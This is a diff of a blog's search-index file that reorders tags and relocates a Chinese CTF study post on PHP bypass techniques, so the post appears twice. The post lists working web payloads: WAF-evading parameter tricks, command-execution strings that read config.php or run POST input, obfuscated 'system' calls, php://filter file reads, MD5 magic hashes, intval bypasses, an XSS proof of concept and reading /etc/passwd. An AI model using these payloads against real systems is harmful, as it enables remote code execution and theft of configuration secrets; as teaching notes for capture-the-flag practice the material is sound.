             <tag> 文件包含 </tag>
             
@@ -556,11 +587,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
             <tag> 文件包含 </tag>
             
@@ -647,11 +678,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
             <tag> 反序列化 </tag>
             
@@ -750,11 +781,11 @@
       
         <tags>
             
-            <tag> PHP </tag>
+            <tag> RCE </tag>
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+            <tag> PHP </tag>
             
             <tag> 隐写 </tag>
             
@@ -1159,33 +1190,6 @@
     
     
     <entry>
-      <title>PHP</title>
-      <link href="/posts/php/"/>
-      <url>/posts/php/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>&quot;换&quot;变量绕过</h1><p>当php进行解析时，如果变量名前面有空格，php会自动去掉前面的空格再进行解析</p><p>所以, 假如 waf 不允许 <code>num</code> 变量接收字母，那么使用 <code>  num</code> 就可以（前面有个空格）</p><p>同理, 当 <code>?num=phpinfo()</code> 报错，那就试试<code>? num=phpinfo()</code></p><h1>弱比较和强比较</h1><table><thead><tr><th>类型</th><th>常见</th><th>原因</th></tr></thead><tbody><tr><td>弱比较</td><td>==, !=</td><td>在比较时会把两边转化为同一类型然后比较值是否相等<br />比较一个数字和字符串或者比较涉及到数字内容的字符串，会被转换成数值并且比较按照数值来进行,舍弃字母</td></tr><tr><td>强比较</td><td>===</td><td>等号两边类型和值必须都相等，否则返回&quot;false&quot;</td></tr></tbody></table><blockquote><p>数值转化规则：在转化时，PHP会从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符（不包含小数点, e, E）</p><p>在遇到e、E时，会按科学计数法处理</p></blockquote><h1>常见过滤绕过</h1><p>部分字符被绕过可以用ascii码进行转换绕过(方法不止一种)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">对目录进行扫描</span><br><span class="line">?num=var_dump(scandir(chr(47)))</span><br><span class="line"></span><br><span class="line">字符串全变</span><br><span class="line">? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a class="header-anchor" href="#命令执行">¶</a>命令执行</h2><p>过滤了system，那我们换成 passthru, echo, eval 等</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">利用 php 的 echo：</span><br><span class="line">?c=”echo `tac config.php`;&quot;</span><br><span class="line">echo file_get_contents(‘config.php’);</span><br><span class="line"></span><br><span class="line">利用其他函数同上:</span><br><span class="line">?c=passthru(‘cat config.php’);</span><br><span class="line">?c=passthru(‘config.php’);</span><br><span class="line">?c=show_source(“config.php”);</span><br><span class="line"></span><br><span class="line">利用php伪协议读取文件：</span><br><span class="line">?c=include(&quot;php://filter/convert.base64-encode/resource=config.php&quot;);</span><br><span class="line"></span><br><span class="line">字符串拼接：?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;cat config.php&#x27;);</span><br><span class="line"></span><br><span class="line">字符串取反构造</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;ls&#x27;);</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;cat config.php&#x27;);</span><br></pre></td></tr></table></figure><p>这个是system取反得到的，脚本实现方法是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=~(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是passthru：其中?&gt;闭合前面的php语句,阻断后面的语句继续执行<code>passthru(‘tac \</code>ls`’);?&gt;`</p><p>一些隔断：<code>?c=passthru('tac confi\*\*\*hp');</code><code>?c=passthru('tac confi/hp');</code></p><p>模糊匹配：当当前路径下只有一个c开头的config.php文件，<code>passthru('tac c*')?&gt;</code></p><p>前面是语句，后面是恶意代码, 这样就可以自动取得a并且执行了<code>?c= include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=config.php</code></p><p>或者用hackbar, 然后POST中输入a=cat config.php</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?c=echo `$_POST[a]`;</span><br></pre></td></tr></table></figure><h2 id="md5-string-raw"><a class="header-anchor" href="#md5-string-raw">¶</a>md5(string,raw)</h2><h3 id="弱比较"><a class="header-anchor" href="#弱比较">¶</a>弱比较</h3><p>用数组和0e方法绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">byGcY</span><br><span class="line">0e591948146966052067035298880982</span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br></pre></td></tr></table></figure><h3 id="两次MD5"><a class="header-anchor" href="#两次MD5">¶</a>两次MD5</h3><p>这个一般都是弱比较, 也有两次md5加密后还是0e开头的</p><table><thead><tr><th style="text-align:left">原字符串</th><th>一次MD5</th><th>两次MD5</th></tr></thead><tbody><tr><td style="text-align:left">CbDLytmyGm2xQyaLNhWn</td><td>0ec20b7c66cafbcc7d8e8481f0653d18</td><td>0e3a5f2a80db371d4610b8f940d296af</td></tr><tr><td style="text-align:left">770hQgrBOjrcqftrlaZk</td><td>0e689b4f703bdc753be7e27b45cb3625</td><td>0e2756da68ef740fd8f5a5c26cc45064</td></tr><tr><td style="text-align:left">7r4lGXCH2Ksu2JNT3BYM</td><td>0e269ab12da27d79a6626d91f34ae849</td><td>0e48d320b2a97ab295f5c4694759889f</td></tr></tbody></table><h3 id="强比较"><a class="header-anchor" href="#强比较">¶</a>强比较</h3><p>依然是数组绕过, 当数组绕过不成立, 就用工具构造md5碰撞</p><h2 id="intval-绕过"><a class="header-anchor" href="#intval-绕过">¶</a>intval()绕过:</h2><p>PHP_5 和PHP_7 的 intval() 规则不一样</p><p>PHP_5中，intval() 会按照数值转化规则（从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符), 很多能用的漏洞都要求php版本正确</p><ul><li>运算</li><li>URL编码</li><li>ASCII编码</li><li>SQL注入</li><li>Power函数</li><li>取反</li><li>引号包裹</li><li>内联注释</li></ul><h3 id="Intval-id-num"><a class="header-anchor" href="#Intval-id-num">¶</a>Intval($id)&gt;num</h3><ul><li>单引号绕过：’1000’</li><li>计算绕过：500/0.5</li><li>函数绕过：power(10,3)</li><li>连接符绕过：?id=100||id=1000</li><li>取反两次绕过：id=~~1000</li><li>二进制绕过：0b1111101000</li><li>其他：?id=/**/1000</li></ul><h1>php内置类</h1><h2 id="Error-Exception进行XSS-绕过Hash比较"><a class="header-anchor" href="#Error-Exception进行XSS-绕过Hash比较">¶</a>Error, Exception进行XSS, 绕过Hash比较</h2><h3 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h3><p>需要有报错的情况Error: 适用于 PHP 7Exception: 适用于PHP 5和7</p><h3 id="XSS"><a class="header-anchor" href="#XSS">¶</a>XSS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">// 测试代码</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//poc</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的话会弹出窗口显示<code>xss</code></p><h3 id="Hash绕过"><a class="header-anchor" href="#Hash绕过">¶</a>Hash绕过</h3><p>这两个异常对象是不同的（异常代码不同）但<code>__toString()</code>方法的输出的结果一模一样**<em>__toString 返回的数据包含当前行号**</em>所以要在同一行写该类调用</p><p>例题: <a href="https://so.csdn.net/so/search?q=%5B2020%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5DGreatphp&amp;t=&amp;u=&amp;urw=">[2020 极客大挑战]Greatphp</a></p><h2 id="内置类读目录-文件"><a class="header-anchor" href="#内置类读目录-文件">¶</a>内置类读目录, 文件</h2><ul><li>Directorylterator (PHP 5, PHP 7, PHP 8)DirectoryIterator与glob://协议结合可以进行目录读取, 显示出当前目录下的文件信息</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取到根目录的文件</span></span><br><span class="line"><span class="built_in">DirectoryIterator</span>(glob:<span class="comment">///*);</span></span><br></pre></td></tr></table></figure><ul><li>FilesystemIterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)FilesystemIterator继承自DirectoryIterator,基本是一样的语法, 但这个类会以绝对路径形式展现</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 root 下文件</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span>(glob:<span class="comment">///root/*);</span></span><br></pre></td></tr></table></figure><ul><li>Globlterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)和上面两个差不多, 以绝对路径形式展现, 可以通过模式匹配来寻找文件路径</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 bin 下的文件</span></span><br><span class="line"><span class="title function_ invoke__">Globlterator</span>(/bin<span class="comment">/*);</span></span><br></pre></td></tr></table></figure><ul><li>SplFileObject (PHP 5 &gt;= 5.1.0, PHP 7, PHP 8)读取文件内容</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 /etc/passwd 文件内容</span></span><br><span class="line"><span class="built_in">SplFileObject</span>(/etc/passwd);</span><br></pre></td></tr></table></figure><h2 id="SimpleXMLElement-XXE"><a class="header-anchor" href="#SimpleXMLElement-XXE">¶</a>SimpleXMLElement - XXE</h2><p>远程包含xml文件</p><h2 id="SoapClient-SSRF"><a class="header-anchor" href="#SoapClient-SSRF">¶</a>SoapClient - SSRF</h2><p>适用于 PHP 5、PHP 7、PHP 8, 只局限于http、https协议</p><h2 id="ReflectionMethod-获取注释内容"><a class="header-anchor" href="#ReflectionMethod-获取注释内容">¶</a>ReflectionMethod - 获取注释内容</h2><p>适用于 PHP 5 &gt;= 5.1.0, PHP 7, PHP 8<code>ReflectionFunction</code> 类的 <code>getDocComment()</code> 方法可以获取注释内容</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> web知识 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> PHP </tag>
-            
-            <tag> 绕过 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>RCE</title>
       <link href="/posts/rce/"/>
       <url>/posts/rce/</url>
@@ -1202,9 +1206,36 @@
       
         <tags>
             
+            <tag> RCE </tag>
+            
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PHP</title>
+      <link href="/posts/php/"/>
+      <url>/posts/php/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>&quot;换&quot;变量绕过</h1><p>当php进行解析时，如果变量名前面有空格，php会自动去掉前面的空格再进行解析</p><p>所以, 假如 waf 不允许 <code>num</code> 变量接收字母，那么使用 <code>  num</code> 就可以（前面有个空格）</p><p>同理, 当 <code>?num=phpinfo()</code> 报错，那就试试<code>? num=phpinfo()</code></p><h1>弱比较和强比较</h1><table><thead><tr><th>类型</th><th>常见</th><th>原因</th></tr></thead><tbody><tr><td>弱比较</td><td>==, !=</td><td>在比较时会把两边转化为同一类型然后比较值是否相等<br />比较一个数字和字符串或者比较涉及到数字内容的字符串，会被转换成数值并且比较按照数值来进行,舍弃字母</td></tr><tr><td>强比较</td><td>===</td><td>等号两边类型和值必须都相等，否则返回&quot;false&quot;</td></tr></tbody></table><blockquote><p>数值转化规则：在转化时，PHP会从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符（不包含小数点, e, E）</p><p>在遇到e、E时，会按科学计数法处理</p></blockquote><h1>常见过滤绕过</h1><p>部分字符被绕过可以用ascii码进行转换绕过(方法不止一种)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">对目录进行扫描</span><br><span class="line">?num=var_dump(scandir(chr(47)))</span><br><span class="line"></span><br><span class="line">字符串全变</span><br><span class="line">? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a class="header-anchor" href="#命令执行">¶</a>命令执行</h2><p>过滤了system，那我们换成 passthru, echo, eval 等</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">利用 php 的 echo：</span><br><span class="line">?c=”echo `tac config.php`;&quot;</span><br><span class="line">echo file_get_contents(‘config.php’);</span><br><span class="line"></span><br><span class="line">利用其他函数同上:</span><br><span class="line">?c=passthru(‘cat config.php’);</span><br><span class="line">?c=passthru(‘config.php’);</span><br><span class="line">?c=show_source(“config.php”);</span><br><span class="line"></span><br><span class="line">利用php伪协议读取文件：</span><br><span class="line">?c=include(&quot;php://filter/convert.base64-encode/resource=config.php&quot;);</span><br><span class="line"></span><br><span class="line">字符串拼接：?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;cat config.php&#x27;);</span><br><span class="line"></span><br><span class="line">字符串取反构造</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;ls&#x27;);</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;cat config.php&#x27;);</span><br></pre></td></tr></table></figure><p>这个是system取反得到的，脚本实现方法是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=~(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是passthru：其中?&gt;闭合前面的php语句,阻断后面的语句继续执行<code>passthru(‘tac \</code>ls`’);?&gt;`</p><p>一些隔断：<code>?c=passthru('tac confi\*\*\*hp');</code><code>?c=passthru('tac confi/hp');</code></p><p>模糊匹配：当当前路径下只有一个c开头的config.php文件，<code>passthru('tac c*')?&gt;</code></p><p>前面是语句，后面是恶意代码, 这样就可以自动取得a并且执行了<code>?c= include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=config.php</code></p><p>或者用hackbar, 然后POST中输入a=cat config.php</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?c=echo `$_POST[a]`;</span><br></pre></td></tr></table></figure><h2 id="md5-string-raw"><a class="header-anchor" href="#md5-string-raw">¶</a>md5(string,raw)</h2><h3 id="弱比较"><a class="header-anchor" href="#弱比较">¶</a>弱比较</h3><p>用数组和0e方法绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">byGcY</span><br><span class="line">0e591948146966052067035298880982</span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br></pre></td></tr></table></figure><h3 id="两次MD5"><a class="header-anchor" href="#两次MD5">¶</a>两次MD5</h3><p>这个一般都是弱比较, 也有两次md5加密后还是0e开头的</p><table><thead><tr><th style="text-align:left">原字符串</th><th>一次MD5</th><th>两次MD5</th></tr></thead><tbody><tr><td style="text-align:left">CbDLytmyGm2xQyaLNhWn</td><td>0ec20b7c66cafbcc7d8e8481f0653d18</td><td>0e3a5f2a80db371d4610b8f940d296af</td></tr><tr><td style="text-align:left">770hQgrBOjrcqftrlaZk</td><td>0e689b4f703bdc753be7e27b45cb3625</td><td>0e2756da68ef740fd8f5a5c26cc45064</td></tr><tr><td style="text-align:left">7r4lGXCH2Ksu2JNT3BYM</td><td>0e269ab12da27d79a6626d91f34ae849</td><td>0e48d320b2a97ab295f5c4694759889f</td></tr></tbody></table><h3 id="强比较"><a class="header-anchor" href="#强比较">¶</a>强比较</h3><p>依然是数组绕过, 当数组绕过不成立, 就用工具构造md5碰撞</p><h2 id="intval-绕过"><a class="header-anchor" href="#intval-绕过">¶</a>intval()绕过:</h2><p>PHP_5 和PHP_7 的 intval() 规则不一样</p><p>PHP_5中，intval() 会按照数值转化规则（从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符), 很多能用的漏洞都要求php版本正确</p><ul><li>运算</li><li>URL编码</li><li>ASCII编码</li><li>SQL注入</li><li>Power函数</li><li>取反</li><li>引号包裹</li><li>内联注释</li></ul><h3 id="Intval-id-num"><a class="header-anchor" href="#Intval-id-num">¶</a>Intval($id)&gt;num</h3><ul><li>单引号绕过：’1000’</li><li>计算绕过：500/0.5</li><li>函数绕过：power(10,3)</li><li>连接符绕过：?id=100||id=1000</li><li>取反两次绕过：id=~~1000</li><li>二进制绕过：0b1111101000</li><li>其他：?id=/**/1000</li></ul><h1>php内置类</h1><h2 id="Error-Exception进行XSS-绕过Hash比较"><a class="header-anchor" href="#Error-Exception进行XSS-绕过Hash比较">¶</a>Error, Exception进行XSS, 绕过Hash比较</h2><h3 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h3><p>需要有报错的情况Error: 适用于 PHP 7Exception: 适用于PHP 5和7</p><h3 id="XSS"><a class="header-anchor" href="#XSS">¶</a>XSS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">// 测试代码</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//poc</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的话会弹出窗口显示<code>xss</code></p><h3 id="Hash绕过"><a class="header-anchor" href="#Hash绕过">¶</a>Hash绕过</h3><p>这两个异常对象是不同的（异常代码不同）但<code>__toString()</code>方法的输出的结果一模一样**<em>__toString 返回的数据包含当前行号**</em>所以要在同一行写该类调用</p><p>例题: <a href="https://so.csdn.net/so/search?q=%5B2020%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5DGreatphp&amp;t=&amp;u=&amp;urw=">[2020 极客大挑战]Greatphp</a></p><h2 id="内置类读目录-文件"><a class="header-anchor" href="#内置类读目录-文件">¶</a>内置类读目录, 文件</h2><ul><li>Directorylterator (PHP 5, PHP 7, PHP 8)DirectoryIterator与glob://协议结合可以进行目录读取, 显示出当前目录下的文件信息</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取到根目录的文件</span></span><br><span class="line"><span class="built_in">DirectoryIterator</span>(glob:<span class="comment">///*);</span></span><br></pre></td></tr></table></figure><ul><li>FilesystemIterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)FilesystemIterator继承自DirectoryIterator,基本是一样的语法, 但这个类会以绝对路径形式展现</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 root 下文件</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span>(glob:<span class="comment">///root/*);</span></span><br></pre></td></tr></table></figure><ul><li>Globlterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)和上面两个差不多, 以绝对路径形式展现, 可以通过模式匹配来寻找文件路径</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 bin 下的文件</span></span><br><span class="line"><span class="title function_ invoke__">Globlterator</span>(/bin<span class="comment">/*);</span></span><br></pre></td></tr></table></figure><ul><li>SplFileObject (PHP 5 &gt;= 5.1.0, PHP 7, PHP 8)读取文件内容</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 /etc/passwd 文件内容</span></span><br><span class="line"><span class="built_in">SplFileObject</span>(/etc/passwd);</span><br></pre></td></tr></table></figure><h2 id="SimpleXMLElement-XXE"><a class="header-anchor" href="#SimpleXMLElement-XXE">¶</a>SimpleXMLElement - XXE</h2><p>远程包含xml文件</p><h2 id="SoapClient-SSRF"><a class="header-anchor" href="#SoapClient-SSRF">¶</a>SoapClient - SSRF</h2><p>适用于 PHP 5、PHP 7、PHP 8, 只局限于http、https协议</p><h2 id="ReflectionMethod-获取注释内容"><a class="header-anchor" href="#ReflectionMethod-获取注释内容">¶</a>ReflectionMethod - 获取注释内容</h2><p>适用于 PHP 5 &gt;= 5.1.0, PHP 7, PHP 8<code>ReflectionFunction</code> 类的 <code>getDocComment()</code> 方法可以获取注释内容</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web知识 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
         </tags>
       
